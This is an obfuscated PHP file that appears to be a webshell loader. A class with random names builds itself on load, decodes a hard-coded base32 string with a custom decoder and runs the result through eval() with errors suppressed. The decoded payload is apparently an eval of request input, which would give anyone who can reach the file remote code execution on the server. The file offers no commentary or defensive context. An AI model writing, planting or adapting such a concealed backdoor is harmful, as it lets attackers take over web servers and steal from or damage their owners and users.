<?php
class OFZS{
        public $GDCW = null;
        public $IQEX = null;
        function __construct(){
        $this->GDCW = 'mv3gc3bierpvat2tkrnxuzlsn5ossoy';
        $this->IQEX = @WGYH($this->GDCW);
        @eval("/*BNP[v=M*/".$this->IQEX."/*BNP[v=M*/");
        }}
new OFZS();
function DKET($BGOV){
    $BASE32_ALPHABET = 'abcdefghijklmnopqrstuvwxyz234567';
    $JPQM = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen($BGOV); $i < $j; $i++){
    $v <<= 8;
        $v += ord($BGOV[$i]);
        $vbits += 8;
        while ($vbits >= 5) {
            $vbits -= 5;
            $JPQM .= $BASE32_ALPHABET[$v >> $vbits];
            $v &= ((1 << $vbits) - 1);}}
    if ($vbits > 0){
        $v <<= (5 - $vbits);
        $JPQM .= $BASE32_ALPHABET[$v];}
    return $JPQM;}
function WGYH($BGOV){
    $JPQM = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen($BGOV); $i < $j; $i++){
        $v <<= 5;
        if ($BGOV[$i] >= 'a' && $BGOV[$i] <= 'z'){
            $v += (ord($BGOV[$i]) - 97);
        } elseif ($BGOV[$i] >= '2' && $BGOV[$i] <= '7') {
            $v += (24 + $BGOV[$i]);
        } else {
            exit(1);
        }
        $vbits += 5;
        while ($vbits >= 8){
            $vbits -= 8;
            $JPQM .= chr($v >> $vbits);
            $v &= ((1 << $vbits) - 1);}}
    return $JPQM;}
?>